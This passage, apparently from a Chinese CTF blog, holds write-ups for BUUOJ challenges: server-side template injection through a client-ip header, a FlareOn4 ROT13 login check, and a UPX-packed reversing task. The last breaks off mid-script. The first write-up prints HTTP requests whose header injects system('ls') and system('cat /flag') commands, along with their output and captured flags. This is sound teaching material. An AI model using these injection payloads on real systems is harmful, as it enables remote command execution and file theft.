class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">client-ip:&#123;1+1&#125;</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>发现也确实可以，尝试读取目录信息：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /flag.php HTTP/1.1</span><br><span class=\"line\">Host: node4.buuoj.cn:26758</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://node4.buuoj.cn:26758/hint.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">client-ip:&#123;system(&#x27;ls&#x27;)&#125;</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>返回的信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Your IP is : bootstrap</span><br><span class=\"line\">css</span><br><span class=\"line\">flag.php</span><br><span class=\"line\">header.php</span><br><span class=\"line\">hint.php</span><br><span class=\"line\">img</span><br><span class=\"line\">index.php</span><br><span class=\"line\">jquery</span><br><span class=\"line\">libs</span><br><span class=\"line\">templates_c</span><br><span class=\"line\">templates_c\t\t</span><br></pre></td></tr></table></figure>\n<p>构造Request，尝试读取flag：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /flag.php HTTP/1.1</span><br><span class=\"line\">Host: node4.buuoj.cn:26758</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://node4.buuoj.cn:26758/hint.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">client-ip:&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>得到返回值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Your IP is : flag&#123;b2aa5179-9750-4a61-9499-30b8c66622a8&#125;</span><br><span class=\"line\">flag&#123;b2aa5179-9750-4a61-9499-30b8c66622a8&#125;</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{b2aa5179-9750-4a61-9499-30b8c66622a8}</del></p>\n","categories":["Web","请求伪造"]},{"title":"FlareOn4-login","url":"/2021/09/04/FlareOn4-login/","content":"<p><a href=\"https://buuoj.cn/challenges#[FlareOn4]login\">题目链接</a><br>附件下载，得到一个html和一个hint：<br><img src=\"/images/Writeup/20210904142948.png\"><br>hint里面没啥提示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hint:本题解出相应字符串后请用flag&#123;&#125;包裹，形如：flag&#123;123456@flare-on.com&#125;</span><br></pre></td></tr></table></figure>\n<p>看一下html：<br><img src=\"/images/Writeup/20210904143026.png\"><br>试了几个字符，看来是要看看源代码了：<br><img src=\"/images/Writeup/20210904143118.png\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">Html</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>FLARE On 2017<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;flag&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;flag&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;prompt&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&quot;prompt&quot;</span>).onclick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">var</span> flag = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&quot;flag&quot;</span>).value;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">var</span> rotFlag = flag.replace(<span class=\"regexp\">/[a-zA-Z]/g</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span> <span class=\"built_in\">String</span>.fromCharCode((c &lt;= <span class=\"string\">&quot;Z&quot;</span> ? <span class=\"number\">90</span> : <span class=\"number\">122</span>) &gt;= (c = c.charCodeAt(<span class=\"number\">0</span>) + <span class=\"number\">13</span>) ? c : c - <span class=\"number\">26</span>);&#125;);</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">if</span> (<span class=\"string\">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    alert(<span class=\"string\">&quot;Correct flag!&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">                &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    alert(<span class=\"string\">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">                &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">            &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>试了一下直接提交PyvragFvqrYbtvafNerRnfl@syner-ba.pbz，没过，看来是要分析一下逻辑了。。<br>核心代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">var rotFlag = flag.replace(/[a-zA-Z]/g, function (c) &#123; return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122)&gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26); &#125;);</span><br></pre></td></tr></table></figure>\n<p>借用网上大佬的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">enc = <span class=\"string\">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> enc:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(i) &gt;= <span class=\"number\">65</span> <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(i) &lt;= <span class=\"number\">90</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(i) - <span class=\"number\">13</span> &lt; <span class=\"number\">65</span> :</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(i) + <span class=\"number\">13</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(i) - <span class=\"number\">13</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">ord</span>(i) &gt;= <span class=\"number\">97</span> <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(i) &lt;= <span class=\"number\">122</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(i) - <span class=\"number\">13</span> &lt; <span class=\"number\">97</span> :</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(i) + <span class=\"number\">13</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(i) - <span class=\"number\">13</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        flag += i</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ClientSideLoginsAreEasy@flare-on.com</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{<a href=\"mailto:&#67;&#108;&#105;&#x65;&#110;&#116;&#83;&#105;&#100;&#x65;&#x4c;&#x6f;&#x67;&#105;&#110;&#115;&#65;&#x72;&#101;&#69;&#x61;&#115;&#121;&#64;&#102;&#108;&#x61;&#x72;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#x6f;&#109;\">&#67;&#108;&#105;&#x65;&#110;&#116;&#83;&#105;&#100;&#x65;&#x4c;&#x6f;&#x67;&#105;&#110;&#115;&#65;&#x72;&#101;&#69;&#x61;&#115;&#121;&#64;&#102;&#108;&#x61;&#x72;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#x6f;&#109;</a>}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/weixin_43859686/article/details/112627046\">[FlareOn4]login</a></p>\n","categories":["Web","Reserve","PHP代码审计"]},{"title":"GUET-CTF2019-re","url":"/2021/09/04/GUET-CTF2019-re/","content":"<p><a href=\"https://buuoj.cn/challenges#[GUET-CTF2019]re\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210904070633.png\"><br>看来是有UPX加壳的，先脱壳一下：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">D:\\<span class=\"title\">Downloads</span>\\<span class=\"title\">attachment</span>&gt;<span class=\"title\">upx</span> -<span class=\"title\">d</span> <span class=\"title\">re</span></span></span><br><span class=\"line\"><span class=\"function\">                       <span class=\"title\">Ultimate</span> <span class=\"title\">Packer</span> <span class=\"title\">for</span> <span class=\"title\">eXecutables</span></span></span><br><span class=\"line\"><span class=\"function\">                          <span class=\"title\">Copyright</span> (<span class=\"title\">C</span>) 1996 - 2020</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">UPX</span> 3.96<span class=\"title\">w</span>       <span class=\"title\">Markus</span> <span class=\"title\">Oberhumer</span>, <span class=\"title\">Laszlo</span> <span class=\"title\">Molnar</span> &amp; <span class=\"title\">John</span> <span class=\"title\">Reiser</span>   <span class=\"title\">Jan</span> 23<span class=\"title\">rd</span> 2020</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">File</span> <span class=\"title\">size</span>         <span class=\"title\">Ratio</span>      <span class=\"title\">Format</span>      <span class=\"title\">Name</span></span></span><br><span class=\"line\"><span class=\"function\">   --------------------   ------   -----------   -----------</span></span><br><span class=\"line\"><span class=\"function\">    840640 &lt;-    304524   36.23%   <span class=\"title\">linux</span>/<span class=\"title\">amd64</span>   <span class=\"title\">re</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Unpacked</span> 1 <span class=\"title\">file</span>.</span></span><br></pre></td></tr></table></figure>\n<p>脱壳之后，拖进IDA分析一下代码，先看一下主函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// positive sp value has been detected, the output may be wrong!</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> __fastcall __noreturn <span class=\"title\">start</span><span class=\"params\">(__int64 a1, __int64 a2, <span class=\"keyword\">int</span> a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *retaddr; <span class=\"comment\">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = v5;</span><br><span class=\"line\">  v5 = v3;</span><br><span class=\"line\">  sub_4016C0(</span><br><span class=\"line\">    (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_400E28,</span><br><span class=\"line\">    v4,</span><br><span class=\"line\">    (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)&amp;retaddr,</span><br><span class=\"line\">    (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_401B80,</span><br><span class=\"line\">    (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_401C10,</span><br><span class=\"line\">    a3,</span><br><span class=\"line\">    (__int64)&amp;v5);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看了一下，应该核心函数是sub_400E28：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__int64 __fastcall <span class=\"title\">sub_400E28</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">int</span> a2, <span class=\"keyword\">int</span> a3, <span class=\"keyword\">int</span> a4, <span class=\"keyword\">int</span> a5, <span class=\"keyword\">int</span> a6)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// er8</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v9; <span class=\"comment\">// er9</span></span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v12; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v12 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_40F950((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)<span class=\"string\">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>); <span class=\"comment\">//打印</span></span><br><span class=\"line\">  sub_40FA80((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)<span class=\"string\">&quot;%s&quot;</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)&amp;v11, v6, v7, v8, v9, v11); <span class=\"comment\">//获取输入，储存到v11</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_4009AE(&amp;v11) ) <span class=\"comment\">//字符串比较</span></span><br><span class=\"line\">    sub_410350(<span class=\"string\">&quot;Correct!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    sub_410350(<span class=\"string\">&quot;Wrong!&quot;</span>);</span><br><span class=\"line\">  result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( __readfsqword(<span class=\"number\">0x28</span>u) != v12 )</span><br><span class=\"line\">    sub_443550();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么应该看一下sub_4009AE里面：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">sub_4009AE</span><span class=\"params\">(<span class=\"keyword\">char</span> *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">1629056</span> * *a1 != <span class=\"number\">166163712</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">6771600</span> * a1[<span class=\"number\">1</span>] != <span class=\"number\">731332800</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">3682944</span> * a1[<span class=\"number\">2</span>] != <span class=\"number\">357245568</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">10431000</span> * a1[<span class=\"number\">3</span>] != <span class=\"number\">1074393000</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">3977328</span> * a1[<span class=\"number\">4</span>] != <span class=\"number\">489211344</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">5138336</span> * a1[<span class=\"number\">5</span>] != <span class=\"number\">518971936</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">7532250</span> * a1[<span class=\"number\">7</span>] != <span class=\"number\">406741500</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">5551632</span> * a1[<span class=\"number\">8</span>] != <span class=\"number\">294236496</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">3409728</span> * a1[<span class=\"number\">9</span>] != <span class=\"number\">177305856</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">13013670</span> * a1[<span class=\"number\">10</span>] != <span class=\"number\">650683500</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">6088797</span> * a1[<span class=\"number\">11</span>] != <span class=\"number\">298351053</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">7884663</span> * a1[<span class=\"number\">12</span>] != <span class=\"number\">386348487</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">8944053</span> * a1[<span class=\"number\">13</span>] != <span class=\"number\">438258597</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">5198490</span> * a1[<span class=\"number\">14</span>] != <span class=\"number\">249527520</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">4544518</span> * a1[<span class=\"number\">15</span>] != <span class=\"number\">445362764</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">3645600</span> * a1[<span class=\"number\">17</span>] != <span class=\"number\">174988800</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">10115280</span> * a1[<span class=\"number\">16</span>] != <span class=\"number\">981182160</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">9667504</span> * a1[<span class=\"number\">18</span>] != <span class=\"number\">493042704</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">5364450</span> * a1[<span class=\"number\">19</span>] != <span class=\"number\">257493600</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">13464540</span> * a1[<span class=\"number\">20</span>] != <span class=\"number\">767478780</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">5488432</span> * a1[<span class=\"number\">21</span>] != <span class=\"number\">312840624</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">14479500</span> * a1[<span class=\"number\">22</span>] != <span class=\"number\">1404511500</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">6451830</span> * a1[<span class=\"number\">23</span>] != <span class=\"number\">316139670</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">6252576</span> * a1[<span class=\"number\">24</span>] != <span class=\"number\">619005024</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">7763364</span> * a1[<span class=\"number\">25</span>] != <span class=\"number\">372641472</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">7327320</span> * a1[<span class=\"number\">26</span>] != <span class=\"number\">373693320</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">8741520</span> * a1[<span class=\"number\">27</span>] != <span class=\"number\">498266640</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">8871876</span> * a1[<span class=\"number\">28</span>] != <span class=\"number\">452465676</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">4086720</span> * a1[<span class=\"number\">29</span>] != <span class=\"number\">208422720</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"number\">9374400</span> * a1[<span class=\"number\">30</span>] == <span class=\"number\">515592000</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">5759124</span> * a1[<span class=\"number\">31</span>] == <span class=\"number\">719890500</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>就是简单地逐位校验，并且a1[6]不见了，打概率可以手动爆破一下，先写一下脚本看一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\">a1 = <span class=\"built_in\">chr</span>(<span class=\"number\">166163712</span> // <span class=\"number\">1629056</span>)</span><br><span class=\"line\">a2 = <span class=\"built_in\">chr</span>(<span class=\"number\">731332800</span> // <span class=\"number\">6771600</span>)</span><br><span class=\"line\">a3 = <span class=\"built_in\">chr</span>(<span class=\"number\">357245568</span> // <span class=\"number\">3682944</span>)</span><br><span class=\"line\">a4 = <span class=\"built_in\">chr</span>(<span class=\"number\">1074393000</span> // <span class=\"number\">10431000</span>)</span><br><span class=\"line\">a5 = <span class=\"built_in\">chr</span>(<span class=\"number\">489211344</span> // <span class=\"number\">3977328</span>)</span><br><span class=\"line\">a6 = <span class=\"built_in\">chr</span>(<span class=\"number\">518971936</span> // <span class=\"number\">5138336</span>)</span><br><span class=\"line\">a8 = <span class=\"built_in\">chr</span>(<span class=\"number\">406741500</span> // <span class=\"number\">7532250</span>)</span><br><span class=\"line\">a9 = <span class=\"built_in\">chr</span>(<span class=\"number\">294236496</span> // <span class=\"number\">5551632</span>)</span><br><span class=\"line\">a10 = <span class=\"built_in\">chr</span>(<span class=\"number\">177305856</span> // <span class=\"number\">3409728</span>)</span><br><span class=\"line\">a11 = <span class=\"built_in\">chr</span>(<span class=\"number\">650683500</span> // <span class=\"number\">13013670</span>)</span><br><span class=\"line\">a12 = <span class=\"built_in\">chr</span>(<span class=\"number\">298351053</span> // <span class=\"number\">6088797</span>)</span><br><span class=\"line\">a13 = <span class=\"built_in\">chr</span>(<span class=\"number\">386348487</span> // <span class=\"number\">7884663</span>)</span><br><span class=\"line\">a14 = <span class=\"built_in\">chr</span>(<span class=\"number\">438258597</span> // <span class=\"number\">8944053</span>)</span><br><span class=\"line\">a15 = <span class=\"built_in\">chr</span>(<span class=\"number\">249527520</span> // <span class=\"number\">5198490</span>)</span><br><span class=\"line\">a16 = <span class=\"built_in\">chr</span>(<span class=\"number\">445362764</span> // <span class=\"number\">4544518</span>)</span><br><span class=\"line\">a17 = <span class=\"built_in\">chr</span>(<span class=\"number\">981182160</span> // <span class=\"number\">10115280</span>)</span><br><span class=\"line\">a18 = <span class=\"built_in\">chr</span>(<span class=\"number\">174988800</span> // <span class=\"number\">3645600</span>)</span><br><span class=\"line\">a19 = <span class=\"built_in\">chr</span>(<span class=\"number\">493042704</span> // <span class=\"number\">9667504</span>)</span><br><span class=\"line\">a20 = <span class=\"built_in\">chr</span>(<span class=\"number\">257493600</span> // <span class=\"number\">5364450</span>)</span><br><span class=\"line\">a21 = <span class=\"built_in\">chr</span>(<span class=\"number\">767478780</span> // <span class=\"number\">13464540</span>)</span><br><span class=\"line\">a22 = <span class=\"built_in\">chr</span>(<span class=\"number\">312840624</span> // <span class=\"number\">5488432</span>)</span><br><span class=\"line\">a23 = <span class=\"built_in\">chr</span>(<span class=\"number\">1404511500</span> // <span class=\"number\">14479500</span>)</span><br><span class=\"line\">a24 = <span class=\"built_in\">chr</span>(<span class=\"number\">316139670</span> // <span class=\"number\">6451830</span>)</span><br><span class=\"line\">a25 = <span class=\"built_in\">chr</span>(<span class=\"number\">619005024</span> // <span class=\"number\">6252576</span>)</span><br><span class=\"line\">a26 = <span class=\"built_in\">chr</span>(<span class=\"number\">372641472</span> // <span class=\"number\">7763364</span>)</span><br><span class=\"line\">a27 = <span class=\"built_in\">chr</span>(<span class=\"number\">373693320</span> // <span class=\"number\">7327320</span>)</span><br><span class=\"line\">a28 = <span class=\"built_in\">chr</span>(<span class=\"number\">498266640</span> // <span class=\"number\">8741520</span>)</span><br><span class=\"line\">a29 = <span class=\"built_in\">chr</span>(<span class=\"number\">452465676</span> // <span class=\"number\">8871876</span>)</span><br><span class=\"line\">a30 = <span class=\"built_in\">chr</span>(<span class=\"number\">208422720</span> // <span class=\"number\">4086720</span>)</span><br><span class=\"line\">a31 = <span class=\"built_in\">chr</span>(<span class=\"number\">515592000</span> // <span class=\"number\">9374400</span>)</span><br><span class=\"line\">a32 = <span class=\"built_in\">chr</span>(<span class=\"number\">719890500</span> // <span 